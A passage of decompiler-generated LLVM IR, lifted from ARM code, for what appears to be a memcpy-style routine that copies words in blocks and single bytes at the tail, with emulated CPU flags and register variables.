  %v2_18adc = load i32, i32* %v1_18adc, align 4
  store i32 %v2_18adc, i32* %r3.global-to-local, align 4
  %v3_18adc = add i32 %v0_18adc, 4
  %v4_18adc = inttoptr i32 %v3_18adc to i32*
  %v5_18adc = load i32, i32* %v4_18adc, align 4
  store i32 %v5_18adc, i32* %r4.global-to-local, align 4
  %v6_18adc = add i32 %v0_18adc, 8
  %v7_18adc = inttoptr i32 %v6_18adc to i32*
  %v8_18adc = load i32, i32* %v7_18adc, align 4
  store i32 %v8_18adc, i32* %ip.global-to-local, align 4
  %v9_18adc = add i32 %v0_18adc, 12
  %v10_18adc = inttoptr i32 %v9_18adc to i32*
  %v11_18adc = load i32, i32* %v10_18adc, align 4
  store i32 %v11_18adc, i32* %lr.global-to-local, align 4
  %v12_18adc = add i32 %v0_18adc, 16
  store i32 %v12_18adc, i32* %r1.global-to-local, align 4
  %v1_18ae0 = inttoptr i32 %v0_18ae0 to i32*
  store i32 %v2_18adc, i32* %v1_18ae0, align 4
  %v3_18ae0 = add i32 %v0_18ae0, 4
  %v4_18ae0 = inttoptr i32 %v3_18ae0 to i32*
  %v5_18ae0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18ae0, i32* %v4_18ae0, align 4
  %v6_18ae0 = add i32 %v0_18ae0, 8
  %v7_18ae0 = inttoptr i32 %v6_18ae0 to i32*
  %v8_18ae0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18ae0, i32* %v7_18ae0, align 4
  %v9_18ae0 = add i32 %v0_18ae0, 12
  %v10_18ae0 = inttoptr i32 %v9_18ae0 to i32*
  %v11_18ae0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18ae0, i32* %v10_18ae0, align 4
  %v12_18ae0 = add i32 %v0_18ae0, 16
  store i32 %v12_18ae0, i32* %r0.global-to-local, align 4
  %v0_18ae4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ae4 = inttoptr i32 %v0_18ae4 to i32*
  %v2_18ae4 = load i32, i32* %v1_18ae4, align 4
  store i32 %v2_18ae4, i32* %r3.global-to-local, align 4
  %v3_18ae4 = add i32 %v0_18ae4, 4
  %v4_18ae4 = inttoptr i32 %v3_18ae4 to i32*
  %v5_18ae4 = load i32, i32* %v4_18ae4, align 4
  store i32 %v5_18ae4, i32* %r4.global-to-local, align 4
  %v6_18ae4 = add i32 %v0_18ae4, 8
  %v7_18ae4 = inttoptr i32 %v6_18ae4 to i32*
  %v8_18ae4 = load i32, i32* %v7_18ae4, align 4
  store i32 %v8_18ae4, i32* @ip, align 4
  %v9_18ae4 = add i32 %v0_18ae4, 12
  %v10_18ae4 = inttoptr i32 %v9_18ae4 to i32*
  %v11_18ae4 = load i32, i32* %v10_18ae4, align 4
  store i32 %v11_18ae4, i32* @lr, align 4
  %v12_18ae4 = add i32 %v0_18ae4, 16
  store i32 %v12_18ae4, i32* %r1.global-to-local, align 4
  %v1_18ae8 = inttoptr i32 %v12_18ae0 to i32*
  store i32 %v2_18ae4, i32* %v1_18ae8, align 4
  %v3_18ae8 = add i32 %v0_18ae0, 20
  %v4_18ae8 = inttoptr i32 %v3_18ae8 to i32*
  %v5_18ae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18ae8, i32* %v4_18ae8, align 4
  %v6_18ae8 = add i32 %v0_18ae0, 24
  %v7_18ae8 = inttoptr i32 %v6_18ae8 to i32*
  %v8_18ae8 = load i32, i32* @ip, align 4
  store i32 %v8_18ae8, i32* %v7_18ae8, align 4
  %v9_18ae8 = add i32 %v0_18ae0, 28
  %v10_18ae8 = inttoptr i32 %v9_18ae8 to i32*
  %v11_18ae8 = load i32, i32* @lr, align 4
  store i32 %v11_18ae8, i32* %v10_18ae8, align 4
  %v12_18ae8 = add i32 %v0_18ae0, 32
  store i32 %v12_18ae8, i32* %r0.global-to-local, align 4
  %v0_18aec = load i32, i32* %r2.global-to-local, align 4
  %v2_18aec = add i32 %v0_18aec, -32
  store i32 %v2_18aec, i32* %r2.global-to-local, align 4
  %v6_18af0 = icmp slt i32 %v0_18aec, 32
  br i1 %v6_18af0, label %dec_label_pc_18af4, label %dec_label_pc_18adc.dec_label_pc_18adc_crit_edge

dec_label_pc_18adc.dec_label_pc_18adc_crit_edge:  ; preds = %dec_label_pc_18adc
  %v0_18adc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18adc

dec_label_pc_18af4:                               ; preds = %dec_label_pc_18adc
  %v4_18af4 = add i32 %v0_18aec, -16
  %v6_18af4 = add i32 %v0_18aec, 2147483616
  %v7_18af4 = and i32 %v4_18af4, %v6_18af4
  %v8_18af4 = icmp slt i32 %v7_18af4, 0
  store i1 %v8_18af4, i1* %cpsr_v.global-to-local, align 1
  %v9_18af4 = icmp slt i32 %v4_18af4, 0
  store i1 %v9_18af4, i1* %cpsr_n.global-to-local, align 1
  %v5_18af8 = icmp slt i32 %v2_18aec, -16
  br i1 %v5_18af8, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_18af4
  %v6_18af8 = load i32, i32* %r1.global-to-local, align 4
  %v7_18af8 = inttoptr i32 %v6_18af8 to i32*
  %v8_18af8 = load i32, i32* %v7_18af8, align 4
  store i32 %v8_18af8, i32* %r3.global-to-local, align 4
  %v9_18af8 = add i32 %v6_18af8, 4
  %v10_18af8 = inttoptr i32 %v9_18af8 to i32*
  %v11_18af8 = load i32, i32* %v10_18af8, align 4
  store i32 %v11_18af8, i32* %r4.global-to-local, align 4
  %v12_18af8 = add i32 %v6_18af8, 8
  %v13_18af8 = inttoptr i32 %v12_18af8 to i32*
  %v14_18af8 = load i32, i32* %v13_18af8, align 4
  store i32 %v14_18af8, i32* @ip, align 4
  %v15_18af8 = add i32 %v6_18af8, 12
  %v16_18af8 = inttoptr i32 %v15_18af8 to i32*
  %v17_18af8 = load i32, i32* %v16_18af8, align 4
  store i32 %v17_18af8, i32* @lr, align 4
  %v18_18af8 = add i32 %v6_18af8, 16
  store i32 %v18_18af8, i32* %r1.global-to-local, align 4
  %v7_18afc = inttoptr i32 %v12_18ae8 to i32*
  store i32 %v8_18af8, i32* %v7_18afc, align 4
  %v9_18afc = add i32 %v0_18ae0, 36
  %v10_18afc = inttoptr i32 %v9_18afc to i32*
  %v11_18afc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_18afc, i32* %v10_18afc, align 4
  %v12_18afc = add i32 %v0_18ae0, 40
  %v13_18afc = inttoptr i32 %v12_18afc to i32*
  %v14_18afc = load i32, i32* @ip, align 4
  store i32 %v14_18afc, i32* %v13_18afc, align 4
  %v15_18afc = add i32 %v0_18ae0, 44
  %v16_18afc = inttoptr i32 %v15_18afc to i32*
  %v17_18afc = load i32, i32* @lr, align 4
  store i32 %v17_18afc, i32* %v16_18afc, align 4
  %v18_18afc = add i32 %v0_18ae0, 48
  store i32 %v18_18afc, i32* %r0.global-to-local, align 4
  %v6_18b00 = load i32, i32* %r2.global-to-local, align 4
  %v7_18b00 = add i32 %v6_18b00, -16
  store i32 %v7_18b00, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18af4, %bb130
  %v3_18b10102 = phi i32 [ %v12_18ae8, %dec_label_pc_18af4 ], [ %v18_18afc, %bb130 ]
  %v0_18b0896 = phi i32 [ %v2_18aec, %dec_label_pc_18af4 ], [ %v7_18b00, %bb130 ]
  %v2_18b04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18b04, i32* @r4, align 4
  br label %dec_label_pc_18b08

dec_label_pc_18b08:                               ; preds = %dec_label_pc_18ad0, %.thread2
  %v3_18b10101 = phi i32 [ %v0_18ae093, %dec_label_pc_18ad0 ], [ %v3_18b10102, %.thread2 ]
  %v0_18b08 = phi i32 [ %v2_18ad0, %dec_label_pc_18ad0 ], [ %v0_18b0896, %.thread2 ]
  %v1_18b08 = add i32 %v0_18b08, 20
  store i32 %v1_18b08, i32* %r2.global-to-local, align 4
  %v3_18b08 = sub i32 0, %v0_18b08
  %v4_18b08 = and i32 %v1_18b08, %v3_18b08
  %v5_18b08 = icmp slt i32 %v4_18b08, 0
  store i1 %v5_18b08, i1* %cpsr_v.global-to-local, align 1
  %v6_18b08 = icmp slt i32 %v1_18b08, 0
  store i1 %v6_18b08, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18b0c

dec_label_pc_18b0c:                               ; preds = %.thread118, %dec_label_pc_18b08
  %v0_18b1c.pre149 = phi i32 [ %v0_18b1c.pre, %.thread118 ], [ %v1_18b08, %dec_label_pc_18b08 ]
  %v3_18b10 = phi i32 [ %v3_18b1099119, %.thread118 ], [ %v3_18b10101, %dec_label_pc_18b08 ]
  %v1_18b14 = phi i1 [ %v1_18b18, %.thread118 ], [ %v5_18b08, %dec_label_pc_18b08 ]
  %v0_18b14 = phi i1 [ %v0_18b18, %.thread118 ], [ %v6_18b08, %dec_label_pc_18b08 ]
  %v2_18b0c = xor i1 %v1_18b14, %v0_18b14
  br i1 %v2_18b0c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_18b0c
  %v3_18b0c = load i32, i32* %r1.global-to-local, align 4
  %v4_18b0c = inttoptr i32 %v3_18b0c to i32*
  %v5_18b0c = load i32, i32* %v4_18b0c, align 4
  store i32 %v5_18b0c, i32* %r3.global-to-local, align 4
  %v6_18b0c = add i32 %v3_18b0c, 4
  %v7_18b0c = inttoptr i32 %v6_18b0c to i32*
  %v8_18b0c = load i32, i32* %v7_18b0c, align 4
  store i32 %v8_18b0c, i32* @ip, align 4
  %v9_18b0c = add i32 %v3_18b0c, 8
  %v10_18b0c = inttoptr i32 %v9_18b0c to i32*
  %v11_18b0c = load i32, i32* %v10_18b0c, align 4
  store i32 %v11_18b0c, i32* @lr, align 4
  %v12_18b0c = add i32 %v3_18b0c, 12
  store i32 %v12_18b0c, i32* %r1.global-to-local, align 4
  %v4_18b10 = inttoptr i32 %v3_18b10 to i32*
  store i32 %v5_18b0c, i32* %v4_18b10, align 4
  %v6_18b10 = add i32 %v3_18b10, 4
  %v7_18b10 = inttoptr i32 %v6_18b10 to i32*
  %v8_18b10 = load i32, i32* @ip, align 4
  store i32 %v8_18b10, i32* %v7_18b10, align 4
  %v9_18b10 = add i32 %v3_18b10, 8
  %v10_18b10 = inttoptr i32 %v9_18b10 to i32*
  %v11_18b10 = load i32, i32* @lr, align 4
  store i32 %v11_18b10, i32* %v10_18b10, align 4
  %v12_18b10 = add i32 %v3_18b10, 12
  store i32 %v12_18b10, i32* %r0.global-to-local, align 4
  %v3_18b14 = load i32, i32* %r2.global-to-local, align 4
  %v4_18b14 = add i32 %v3_18b14, -12
  store i32 %v4_18b14, i32* %r2.global-to-local, align 4
  %v6_18b14 = sub i32 11, %v3_18b14
  %v7_18b14 = and i32 %v6_18b14, %v3_18b14
  %v8_18b14 = icmp slt i32 %v7_18b14, 0
  store i1 %v8_18b14, i1* %cpsr_v.global-to-local, align 1
  %v9_18b14 = icmp slt i32 %v4_18b14, 0
  store i1 %v9_18b14, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_18b0c, %bb131
  %v0_18b1c.pre = phi i32 [ %v4_18b14, %bb131 ], [ %v0_18b1c.pre149, %dec_label_pc_18b0c ]
  %v3_18b1099119 = phi i32 [ %v12_18b10, %bb131 ], [ %v3_18b10, %dec_label_pc_18b0c ]
  %v1_18b18 = phi i1 [ %v8_18b14, %bb131 ], [ %v1_18b14, %dec_label_pc_18b0c ]
  %v0_18b18 = phi i1 [ %v9_18b14, %bb131 ], [ %v0_18b14, %dec_label_pc_18b0c ]
  %v2_18b18 = xor i1 %v1_18b18, %v0_18b18
  br i1 %v2_18b18, label %dec_label_pc_18b1c, label %dec_label_pc_18b0c

dec_label_pc_18b1c:                               ; preds = %.thread118, %dec_label_pc_18ac8
  %v7_18b2c = phi i32 [ %v0_18ae093, %dec_label_pc_18ac8 ], [ %v3_18b1099119, %.thread118 ]
  %v0_18b1c = phi i32 [ %v2_18ac8, %dec_label_pc_18ac8 ], [ %v0_18b1c.pre, %.thread118 ]
  %v2_18b1c = add i32 %v0_18b1c, 8
  store i32 %v2_18b1c, i32* %r2.global-to-local, align 4
  %v4_18b1c = sub i32 0, %v0_18b1c
  %v5_18b1c = and i32 %v2_18b1c, %v4_18b1c
  %v6_18b1c = icmp slt i32 %v5_18b1c, 0
  store i1 %v6_18b1c, i1* %cpsr_v.global-to-local, align 1
  %v7_18b1c = icmp slt i32 %v2_18b1c, 0
  store i1 %v7_18b1c, i1* %cpsr_n.global-to-local, align 1
  %v5_18b20 = icmp slt i32 %v0_18b1c, -8
  br i1 %v5_18b20, label %bb133, label %dec_label_pc_18b24

dec_label_pc_18b24:                               ; preds = %dec_label_pc_18b1c
  %v6_18b24 = add i32 %v0_18b1c, 4
  store i32 %v6_18b24, i32* %r2.global-to-local, align 4
  %v8_18b24 = sub i32 -5, %v0_18b1c
  %v9_18b24 = and i32 %v8_18b24, %v2_18b1c
  %v10_18b24 = icmp slt i32 %v9_18b24, 0
  store i1 %v10_18b24, i1* %cpsr_v.global-to-local, align 1
  %v11_18b24 = icmp slt i32 %v6_18b24, 0
  store i1 %v11_18b24, i1* %cpsr_n.global-to-local, align 1
  %v5_18b28 = icmp slt i32 %v2_18b1c, 4
  %v6_18b28 = load i32, i32* %r1.global-to-local, align 4
  %v7_18b28 = inttoptr i32 %v6_18b28 to i32*
  %v8_18b28 = load i32, i32* %v7_18b28, align 4
  store i32 %v8_18b28, i32* %r3.global-to-local, align 4
  %v10_18b28 = add i32 %v6_18b28, 4
  br i1 %v5_18b28, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_18b24
  store i32 %v10_18b28, i32* %r1.global-to-local, align 4
  %v8_18b2c = inttoptr i32 %v7_18b2c to i32*
  store i32 %v8_18b28, i32* %v8_18b2c, align 4
  %v9_18b2c = load i32, i32* %r0.global-to-local, align 4
  %v10_18b2c = add i32 %v9_18b2c, 4
  store i32 %v10_18b2c, i32* %r0.global-to-local, align 4
  %v0_18b3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_18b24
  %v10_18b30 = inttoptr i32 %v10_18b28 to i32*
  %v11_18b30 = load i32, i32* %v10_18b30, align 4
  store i32 %v11_18b30, i32* @ip, align 4
  %v12_18b30 = add i32 %v6_18b28, 8
  store i32 %v12_18b30, i32* %r1.global-to-local, align 4
  %v7_18b34 = inttoptr i32 %v7_18b2c to i32*
  store i32 %v8_18b28, i32* %v7_18b34, align 4
  %v9_18b34 = add i32 %v7_18b2c, 4
  %v10_18b34 = inttoptr i32 %v9_18b34 to i32*
  %v11_18b34 = load i32, i32* @ip, align 4
  store i32 %v11_18b34, i32* %v10_18b34, align 4
  %v12_18b34 = add i32 %v7_18b2c, 8
  store i32 %v12_18b34, i32* %r0.global-to-local, align 4
  %v6_18b38 = load i32, i32* %r2.global-to-local, align 4
  %v7_18b38 = add i32 %v6_18b38, -4
  store i32 %v7_18b38, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_18b1c, %bb, %dec_label_pc_18ce4, %dec_label_pc_18c0c, %dec_label_pc_18c78, %bb132
  %v2_18b4c = phi i32 [ %v10_18b2c, %.thread6 ], [ %v0_18bdc76, %.thread12 ], [ %v7_18b2c, %dec_label_pc_18b1c ], [ %v1_18aa0, %bb ], [ %v2_18b4c114, %dec_label_pc_18ce4 ], [ %v2_18b4c113, %dec_label_pc_18c0c ], [ %v2_18b4c112, %dec_label_pc_18c78 ], [ %v12_18b34, %bb132 ]
  %v0_18b3c = phi i32 [ %v0_18b3c.pre, %.thread6 ], [ %v2_18b84, %.thread12 ], [ %v2_18b1c, %dec_label_pc_18b1c ], [ %v2_18ab0, %bb ], [ %v0_18b3c110, %dec_label_pc_18ce4 ], [ %v0_18b3c109, %dec_label_pc_18c0c ], [ %v0_18b3c108, %dec_label_pc_18c78 ], [ %v7_18b38, %bb132 ]
  %v1_18b3c = add i32 %v0_18b3c, 4
  store i32 %v1_18b3c, i32* @r2, align 4
  %v3_18b3c = sub i32 0, %v0_18b3c
  %v4_18b3c = and i32 %v1_18b3c, %v3_18b3c
  %v5_18b3c = icmp slt i32 %v4_18b3c, 0
  store i1 %v5_18b3c, i1* %cpsr_v.global-to-local, align 1
  %v6_18b3c = icmp slt i32 %v1_18b3c, 0
  store i1 %v6_18b3c, i1* %cpsr_n.global-to-local, align 1
  %v7_18b3c = icmp eq i32 %v1_18b3c, 0
  store i1 %v7_18b3c, i1* @cpsr_z, align 1
  br i1 %v7_18b3c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_18b40 = load i8*, i8** %stack_var_-8, align 4
  %v4_18b40 = ptrtoint i8* %v3_18b40 to i32
  store i32 %v4_18b40, i32* %r0.global-to-local, align 4
  ret i32 %v4_18b40

bb135:                                            ; preds = %bb133
  %v1_18b44 = add i32 %v0_18b3c, 2
  %v3_18b44 = sub i32 -3, %v0_18b3c
  %v4_18b44 = and i32 %v3_18b44, %v1_18b3c
  %v5_18b44 = icmp slt i32 %v4_18b44, 0
  store i1 %v5_18b44, i1* %cpsr_v.global-to-local, align 1
  %v6_18b44 = icmp slt i32 %v1_18b44, 0
  store i1 %v6_18b44, i1* %cpsr_n.global-to-local, align 1
  %v7_18b44 = icmp eq i32 %v1_18b3c, 2
  store i1 %v7_18b44, i1* @cpsr_z, align 1
  %v0_18b48 = load i32, i32* %r1.global-to-local, align 4
  %v1_18b48 = inttoptr i32 %v0_18b48 to i8*
  %v2_18b48 = load i8, i8* %v1_18b48, align 1
  %v3_18b48 = zext i8 %v2_18b48 to i32
  store i32 %v3_18b48, i32* %r3.global-to-local, align 4
  %v5_18b48 = add i32 %v0_18b48, 1
  store i32 %v5_18b48, i32* %r1.global-to-local, align 4
  %v3_18b4c = inttoptr i32 %v2_18b4c to i8*
  store i8 %v2_18b48, i8* %v3_18b4c, align 1
  %v4_18b4c = load i32, i32* %r0.global-to-local, align 4
  %v5_18b4c = add i32 %v4_18b4c, 1
  store i32 %v5_18b4c, i32* %r0.global-to-local, align 4
  %v0_18b50 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18b50 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18b50 = xor i1 %v0_18b50, %v1_18b50
  br i1 %v2_18b50, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_18b50 = load i32, i32* %r1.global-to-local, align 4
  %v4_18b50 = inttoptr i32 %v3_18b50 to i8*
  %v5_18b50 = load i8, i8* %v4_18b50, align 1
  %v6_18b50 = zext i8 %v5_18b50 to i32
  store i32 %v6_18b50, i32* %r3.global-to-local, align 4
  %v8_18b50 = add i32 %v3_18b50, 1
  store i32 %v8_18b50, i32* %r1.global-to-local, align 4
  %v6_18b54 = inttoptr i32 %v5_18b4c to i8*
  store i8 %v5_18b50, i8* %v6_18b54, align 1
  %v7_18b54 = load i32, i32* %r0.global-to-local, align 4
  %v8_18b54 = add i32 %v7_18b54, 1
  store i32 %v8_18b54, i32* %r0.global-to-local, align 4
  %v1_18b58.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18b58.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_18b5c = phi i32 [ %v8_18b54, %bb136 ], [ %v5_18b4c, %bb135 ]
  %v2_18b5c = phi i1 [ %v2_18b58.pre, %bb136 ], [ %v1_18b50, %bb135 ]
  %v1_18b5c = phi i1 [ %v1_18b58.pre, %bb136 ], [ %v0_18b50, %bb135 ]
  %v0_18b58 = load i1, i1* @cpsr_z, align 1
  %v3_18b58 = xor i1 %v2_18b5c, %v1_18b5c
  %v4_18b58 = or i1 %v0_18b58, %v3_18b58
  br i1 %v4_18b58, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_18b58 = load i32, i32* %r1.global-to-local, align 4
  %v6_18b58 = inttoptr i32 %v5_18b58 to i8*
  %v7_18b58 = load i8, i8* %v6_18b58, align 1
  %v8_18b58 = zext i8 %v7_18b58 to i32
  store i32 %v8_18b58, i32* %r3.global-to-local, align 4
  %v10_18b58 = add i32 %v5_18b58, 1
  store i32 %v10_18b58, i32* %r1.global-to-local, align 4
  %v8_18b5c = inttoptr i32 %v7_18b5c to i8*
  store i8 %v7_18b58, i8* %v8_18b5c, align 1
  %v9_18b5c = load i32, i32* %r0.global-to-local, align 4
  %v10_18b5c = add i32 %v9_18b5c, 1
  store i32 %v10_18b5c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_18b60 = load i8*, i8** %stack_var_-8, align 4
  %v3_18b60 = ptrtoint i8* %v2_18b60 to i32
  store i32 %v3_18b60, i32* %r0.global-to-local, align 4
  ret i32 %v3_18b60

dec_label_pc_18b64:                               ; preds = %dec_label_pc_18ab8
  %v1_18b64 = sub nsw i32 4, %v1_18ab8
  store i32 %v1_18b64, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18b68 = icmp ult i32 %v1_18b64, 2
  store i1 %v8_18b68, i1* %cpsr_n.global-to-local, align 1
  %v1_18b6c = inttoptr i32 %v0_18aa0 to i8*
  %v2_18b6c = load i8, i8* %v1_18b6c, align 1
  %v3_18b6c = zext i8 %v2_18b6c to i32
  store i32 %v3_18b6c, i32* %r3.global-to-local, align 4
  %v5_18b6c = add i32 %v0_18aa0, 1
  store i32 %v5_18b6c, i32* %r1.global-to-local, align 4
  store i8 %v2_18b6c, i8* %v5_18aac, align 1
  %v4_18b70 = load i32, i32* %r0.global-to-local, align 4
  %v5_18b70 = add i32 %v4_18b70, 1
  store i32 %v5_18b70, i32* %r0.global-to-local, align 4
  br i1 %v8_18b68, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_18b64
  %v9_18b68 = icmp eq i32 %v1_18b64, 2
  %v6_18b74 = load i32, i32* %r1.global-to-local, align 4
  %v7_18b74 = inttoptr i32 %v6_18b74 to i8*
  %v8_18b74 = load i8, i8* %v7_18b74, align 1
  %v9_18b74 = zext i8 %v8_18b74 to i32
  store i32 %v9_18b74, i32* %r3.global-to-local, align 4
  %v11_18b74 = add i32 %v6_18b74, 1
  store i32 %v11_18b74, i32* %r1.global-to-local, align 4
  %v9_18b78 = inttoptr i32 %v5_18b70 to i8*
  store i8 %v8_18b74, i8* %v9_18b78, align 1
  %v10_18b78 = load i32, i32* %r0.global-to-local, align 4
  %v11_18b78 = add i32 %v10_18b78, 1
  store i32 %v11_18b78, i32* %r0.global-to-local, align 4
  br i1 %v9_18b68, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_18b7c = load i32, i32* %r1.global-to-local, align 4
  %v9_18b7c = inttoptr i32 %v8_18b7c to i8*
  %v10_18b7c = load i8, i8* %v9_18b7c, align 1
  %v11_18b7c = zext i8 %v10_18b7c to i32
  store i32 %v11_18b7c, i32* %r3.global-to-local, align 4
  %v13_18b7c = add i32 %v8_18b7c, 1
  store i32 %v13_18b7c, i32* %r1.global-to-local, align 4
  %v11_18b80 = inttoptr i32 %v11_18b78 to i8*
  store i8 %v10_18b7c, i8* %v11_18b80, align 1
  %v12_18b80 = load i32, i32* %r0.global-to-local, align 4
  %v13_18b80 = add i32 %v12_18b80, 1
  store i32 %v13_18b80, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_18b64, %bb139
  %v0_18bdc76 = phi i32 [ %v11_18b78, %bb138 ], [ %v5_18b70, %dec_label_pc_18b64 ], [ %v13_18b80, %bb139 ]
  %v0_18b84 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b84 = load i32, i32* @ip, align 4
  %v2_18b84 = sub i32 %v0_18b84, %v1_18b84
  store i32 %v2_18b84, i32* %r2.global-to-local, align 4
  %v4_18b84 = xor i32 %v1_18b84, %v0_18b84
  %v5_18b84 = xor i32 %v2_18b84, %v0_18b84
  %v6_18b84 = and i32 %v5_18b84, %v4_18b84
  %v7_18b84 = icmp slt i32 %v6_18b84, 0
  store i1 %v7_18b84, i1* %cpsr_v.global-to-local, align 1
  %v8_18b84 = icmp slt i32 %v2_18b84, 0
  store i1 %v8_18b84, i1* %cpsr_n.global-to-local, align 1
  %v5_18b88 = icmp slt i32 %v0_18b84, %v1_18b84
  br i1 %v5_18b88, label %bb133, label %dec_label_pc_18b8c

dec_label_pc_18b8c:                               ; preds = %.thread12
  %v0_18b8c = load i32, i32* %r1.global-to-local, align 4
  %v1_18b8c = urem i32 %v0_18b8c, 4
  store i32 %v1_18b8c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18b8c = icmp eq i32 %v1_18b8c, 0
  %extract.t124 = trunc i32 %v0_18b8c to i2
  br i1 %v2_18b8c, label %dec_label_pc_18ac8, label %dec_label_pc_18b94

dec_label_pc_18b94:                               ; preds = %dec_label_pc_18ac0, %dec_label_pc_18b8c
  %v0_18bdc75 = phi i32 [ %v1_18aa0, %dec_label_pc_18ac0 ], [ %v0_18bdc76, %dec_label_pc_18b8c ]
  %v0_18c88 = phi i32 [ %v2_18ab0, %dec_label_pc_18ac0 ], [ %v2_18b84, %dec_label_pc_18b8c ]
  %v0_18b9c.off0 = phi i2 [ %extract.t, %dec_label_pc_18ac0 ], [ %extract.t124, %dec_label_pc_18b8c ]
  %v0_18b94 = phi i32 [ %v0_18aa0, %dec_label_pc_18ac0 ], [ %v0_18b8c, %dec_label_pc_18b8c ]
  %v1_18b94 = and i32 %v0_18b94, -4
  store i32 %v1_18b94, i32* %r1.global-to-local, align 4
  %v1_18b98 = inttoptr i32 %v1_18b94 to i32*
  %v2_18b98 = load i32, i32* %v1_18b98, align 4
  store i32 %v2_18b98, i32* @lr, align 4
  %v4_18b98 = add i32 %v1_18b94, 4
  store i32 %v4_18b98, i32* %r1.global-to-local, align 4
  %v2_18c80 = add i32 %v0_18c88, -12
  %v4_18c80 = sub i32 11, %v0_18c88
  %v5_18c80 = and i32 %v4_18c80, %v0_18c88
  %v6_18c80 = icmp slt i32 %v5_18c80, 0
  store i1 %v6_18c80, i1* %cpsr_v.global-to-local, align 1
  %v7_18c80 = icmp slt i32 %v2_18c80, 0
  store i1 %v7_18c80, i1* %cpsr_n.global-to-local, align 1
  %v5_18c84 = icmp slt i32 %v0_18c88, 12
  switch i2 %v0_18b9c.off0, label %dec_label_pc_18ba8 [
    i2 -1, label %dec_label_pc_18c80
    i2 -2, label %dec_label_pc_18c14
  ]

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18b94
  br i1 %v5_18c84, label %dec_label_pc_18bf4, label %dec_label_pc_18bb0

dec_label_pc_18bb0:                               ; preds = %dec_label_pc_18ba8
  store i32 %v2_18c80, i32* %r2.global-to-local, align 4
  %v3_18bb4 = load i32, i32* @r4, align 4
  store i32 %v3_18bb4, i32* %stack_var_-16, align 4
  %v6_18bb4 = load i32, i32* @r5, align 4
  store i32 %v6_18bb4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18bb8

dec_label_pc_18bb8:                               ; preds = %dec_label_pc_18bb8.dec_label_pc_18bb8_crit_edge, %dec_label_pc_18bb0
  %v0_18bdc = phi i32 [ %v12_18bdc, %dec_label_pc_18bb8.dec_label_pc_18bb8_crit_edge ], [ %v0_18bdc75, %dec_label_pc_18bb0 ]
  %v0_18bbc = phi i32 [ %v0_18bbc.pre, %dec_label_pc_18bb8.dec_label_pc_18bb8_crit_edge ], [ %v4_18b98, %dec_label_pc_18bb0 ]
  %v0_18bb8 = phi i32 [ %v0_18bb8.pre, %dec_label_pc_18bb8.dec_label_pc_18bb8_crit_edge ], [ %v2_18b98, %dec_label_pc_18bb0 ]
  %v3_18bb8 = udiv i32 %v0_18bb8, 256
  store i32 %v3_18bb8, i32* %r3.global-to-local, align 4
  %v1_18bbc = inttoptr i32 %v0_18bbc to i32*
  %v2_18bbc = load i32, i32* %v1_18bbc, align 4
  store i32 %v2_18bbc, i32* %r4.global-to-local, align 4
  %v3_18bbc = add i32 %v0_18bbc, 4
  %v4_18bbc = inttoptr i32 %v3_18bbc to i32*
  %v5_18bbc = load i32, i32* %v4_18bbc, align 4
  store i32 %v5_18bbc, i32* %r5.global-to-local, align 4
  %v6_18bbc = add i32 %v0_18bbc, 8
  %v7_18bbc = inttoptr i32 %v6_18bbc to i32*
  %v8_18bbc = load i32, i32* %v7_18bbc, align 4
  store i32 %v8_18bbc, i32* %ip.global-to-local, align 4
  %v9_18bbc = add i32 %v0_18bbc, 12
  %v10_18bbc = inttoptr i32 %v9_18bbc to i32*
  %v11_18bbc = load i32, i32* %v10_18bbc, align 4
  store i32 %v11_18bbc, i32* @lr, align 4
  %v12_18bbc = add i32 %v0_18bbc, 16
  store i32 %v12_18bbc, i32* %r1.global-to-local, align 4
  %v4_18bc0 = mul i32 %v2_18bbc, 16777216
  %v5_18bc0 = or i32 %v4_18bc0, %v3_18bb8
  store i32 %v5_18bc0, i32* %r3.global-to-local, align 4
  %v3_18bc4 = udiv i32 %v2_18bbc, 256
  %v4_18bc8 = mul i32 %v5_18bbc, 16777216
  %v5_18bc8 = or i32 %v4_18bc8, %v3_18bc4
  store i32 %v5_18bc8, i32* %r4.global-to-local, align 4
  %v3_18bcc = udiv i32 %v5_18bbc, 256
  %v4_18bd0 = mul i32 %v8_18bbc, 16777216
  %v5_18bd0 = or i32 %v4_18bd0, %v3_18bcc
  store i32 %v5_18bd0, i32* %r5.global-to-local, align 4
  %v3_18bd4 = udiv i32 %v8_18bbc, 256
